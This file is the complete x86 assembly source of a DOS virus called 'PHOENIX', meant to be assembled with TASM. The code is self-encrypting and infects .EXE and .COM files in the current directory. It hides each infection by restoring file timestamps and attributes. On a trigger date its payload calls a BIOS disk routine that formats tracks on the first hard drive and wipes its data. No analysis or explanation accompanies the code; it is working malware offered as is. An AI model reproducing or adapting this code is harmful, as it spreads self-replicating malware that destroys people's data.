; ASSEMBLE USING TASM UNDER DOS.
; IT'S PROBABLY NOT GOING TO WORK ON WINDOWS 3.11+
;                                 ~ KPS

.MODEL TINY
.CODE
ORG 100H
ID = 'PH'
ENTRY_POINT: DB 0E9H,0,0
STARTVIRUS:
DECRYPT:
    PATCH_STARTENCRYPT:
    MOV BP,OFFSET STARTENCRYPT
    MOV CX,(OFFSET HEAP - OFFSET STARTENCRYPT)/2
DECRYPT_LOOP:
    DB 2EH,81H,46H,0
    DECRYPT_VALUE DW 0
    INC BP
    INC BP
    LOOP DECRYPT_LOOP
STARTENCRYPT:
    CALL NEXT
    NEXT: POP BP
    SUB BP,OFFSET NEXT
    CMP SP,ID
    JE RESTOREEXE
RESTORECOM:
    LEA SI,[BP+OFFSET SAVE3]
    MOV DI,100H
    PUSH DI
    MOVSB
    JMP SHORT RESTOREEXIT
RESTOREEXE:
    PUSH DS
    PUSH ES
    PUSH CS
    POP DS
    PUSH CS
    POP ES
    LEA SI,[BP+OFFSET OLDCSIP2]
    LEA DI,[BP+OFFSET OLDCSIP]
    MOVSW
    MOVSW
    MOVSW
RESTOREEXIT:
    MOVSW
    MOV BYTE PTR [BP+NUMINFEC],3
    MOV AH,1AH
    LEA DX,[BP+OFFSET NEWDTA]
    INT 21H
    LEA DX,[BP+OFFSET EXE_MASK]
    CALL INFECT_MASK
    LEA DX,[BP+OFFSET COM_MASK]
    CALL INFECT_MASK
DONE_INFECTIONS:
    MOV AH,2AH
    INT 21H
    CMP DH,7
    JNZ EXIT_VIRUS
    CMP DL,9
    JZ ACTIVATE
EXIT_VIRUS:
    MOV AH,1AH
    MOV DX,80H
    CMP SP,ID-4
    JZ RETURNEXE
RETURNCOM:
    INT 21H
    RETN
RETURNEXE:
    POP ES
    POP DS
    INT 21H
    MOV AX,ES
    ADD AX,10H
    ADD WORD PTR CS:[BP+OLDCSIP+2],AX
    ADD AX,WORD PTR CS:[BP+OLDSSSP+2]
    CLI
    MOV SP,WORD PTR CS:[BP+OLDSSSP]
    MOV SS,AX
    STI
DB 0EAH
OLDCSIP DB ?
SAVE3 DB 0CDH,20H,0
OLDSSSP DD ?
OLDCSIP2 DD ?
OLDSSSP2 DD ?
ACTIVATE:
    MOV AH,05H
    MOV DL,80H
    MOV DH,0H
    MOV CX,0000H
    MOV AL,11H
    MOV BX,OFFSET DSTRY
    INT 13H
    RET
    CLI
    HLT
    JMP EXIT_VIRUS
VIRUS DB 'PHOENIX',0
AUTHOR DB 'BY K. PALAIOLOGOS',0
DSTRY DB 0,0,0,2, 0,0,1,2, 0,0,2,2, 0,0,3,2, 0,0,4,2, 0,0,5,2, 0,0,6,2, 0,0,7,2, 0,0,8,2, 0,0,9,2, 0,0,10,2, 0,0,11,2, 0,0,12,2, 0,0,13,2, 0,0,14,2, 0,0,15,2, 0,0,16,2
INFECT_MASK:
    MOV AH,4EH
    MOV CX,7
FINDFIRSTNEXT:
    INT 21H
    JC EXIT_INFECT_MASK
    XOR CX,CX
    CALL ATTRIBUTES
    MOV AX,3D02H
    INT 21H
    XCHG AX,BX
    MOV AH,3FH
    LEA DX,[BP+OFFSET BUFFER]
    MOV CX,1AH
    INT 21H
    MOV AX,4202H
    XOR CX,CX
    CWD
    INT 21H
    CMP WORD PTR [BP+BUFFER],'ZM'
    JZ CHECKEXE
CHECKCOM:
    MOV AX,WORD PTR [BP+NEWDTA+1AH]
    CMP AX,65535-(ENDHEAP-DECRYPT)
    JA FIND_NEXT
    MOV CX,WORD PTR [BP+BUFFER+1]
    ADD CX,HEAP-STARTVIRUS+3
    CMP AX,CX
    JE FIND_NEXT
    JMP INFECT_COM
CHECKEXE:
    CMP WORD PTR [BP+BUFFER+10H],ID
    JNZ INFECT_EXE
DONE_FILE:
    MOV AX,5701H
    MOV CX,WORD PTR [BP+NEWDTA+16H]
    MOV DX,WORD PTR [BP+NEWDTA+18H]
    INT 21H
    MOV AH,3EH
    INT 21H
    MOV CH,0
    MOV CL,BYTE PTR [BP+NEWDTA+15H]
    CALL ATTRIBUTES
    CMP BYTE PTR [BP+NUMINFEC], 0
    JNZ FIND_NEXT
    POP AX
    JMP DONE_INFECTIONS
FIND_NEXT:
    MOV AH,4FH
    JMP SHORT FINDFIRSTNEXT
EXIT_INFECT_MASK:
    RET
INFECT_EXE:
    MOV CX, 1AH
    PUSH CX
    PUSH BX
    LES AX,DWORD PTR [BP+BUFFER+14H]
    MOV WORD PTR [BP+OLDCSIP2], AX
    MOV WORD PTR [BP+OLDCSIP2+2], ES
    LES AX,DWORD PTR [BP+BUFFER+0EH]
    MOV WORD PTR [BP+OLDSSSP2],ES
    MOV WORD PTR [BP+OLDSSSP2+2],AX
    MOV AX,WORD PTR [BP+BUFFER+8]
    MOV CL, 4
    SHL AX, CL
    XCHG AX, BX
    LES AX,DWORD PTR [BP+NEWDTA+26]
    MOV DX, ES
    PUSH AX
    PUSH DX
    SUB AX, BX
    SBB DX, 0
    MOV CX, 10H
    DIV CX
    MOV WORD PTR [BP+BUFFER+14H], DX
    MOV WORD PTR [BP+BUFFER+16H], AX
    MOV WORD PTR [BP+BUFFER+0EH], AX
    MOV WORD PTR [BP+BUFFER+10H], ID
    POP DX
    POP AX
    POP BX
    ADD AX, HEAP-STARTVIRUS
    ADC DX, 0
    MOV CL, 9
    PUSH AX
    SHR AX, CL
    ROR DX, CL
    STC
    ADC DX, AX
    POP AX
    AND AH, 1
    MOV WORD PTR [BP+BUFFER+4], DX
    MOV WORD PTR [BP+BUFFER+2], AX
    PUSH CS
    POP ES
    MOV AX,WORD PTR [BP+BUFFER+14H]
    JMP SHORT FINISHINFECTION
INFECT_COM:
    MOV CX,3
    PUSH CX
    SUB AX,CX
    LEA SI,[BP+OFFSET BUFFER]
    LEA DI,[BP+OFFSET SAVE3]
    MOVSW
    MOVSB
    MOV BYTE PTR [SI-3],0E9H
    MOV WORD PTR [SI-2],AX
    ADD AX,103H
FINISHINFECTION:
    ADD AX,OFFSET STARTENCRYPT-OFFSET DECRYPT
    PUSH AX
    MOV AH,2CH
    INT 21H
    MOV [BP+DECRYPT_VALUE],DX
    LEA DI,[BP+OFFSET CODESTORE]
    MOV AL,55H
    STOSB
    LEA SI,[BP+OFFSET DECRYPT]
    MOV CX,STARTENCRYPT-DECRYPT
    PUSH SI
    PUSH CX
    REP MOVSB
    XOR BYTE PTR [BP+DECRYPT_LOOP+2],028H
    LEA SI,[BP+OFFSET WRITE]
    MOV CX,ENDWRITE-WRITE
    REP MOVSB
    POP CX
    POP SI
    POP AX
    PUSH DI
    PUSH SI
    PUSH CX
    REP MOVSB
    MOV WORD PTR [BP+PATCH_STARTENCRYPT+1],AX
    MOV AL,5DH
    STOSB
    MOV AL,0C3H
    STOSB
    CALL CODESTORE
    POP CX
    POP DI
    POP SI
    REP MOVSB
    MOV AX,4200H
    XOR CX,CX
    CWD
    INT 21H
    MOV AH,40H
    LEA DX,[BP+OFFSET BUFFER]
    POP CX
    INT 21H
    DEC BYTE PTR [BP+NUMINFEC]
    JMP DONE_FILE
ATTRIBUTES:
    MOV AX,4301H
    LEA DX,[BP+OFFSET NEWDTA+30]
    INT 21H
    RET
WRITE:
    POP BP
    MOV AH,40H
    LEA DX,[BP+OFFSET DECRYPT]
    MOV CX,HEAP-DECRYPT
    INT 21H
    PUSH BP
ENDWRITE:
EXE_MASK DB '*.EXE',0
COM_MASK DB '*.COM',0
HEAP:
CODESTORE:DB (STARTENCRYPT-DECRYPT)*2+(ENDWRITE-WRITE)+3 DUP (?)
NEWDTA DB 43 DUP (?)
NUMINFEC DB ?
BUFFER DB 1AH DUP (?)
ENDHEAP:
END ENTRY_POINT
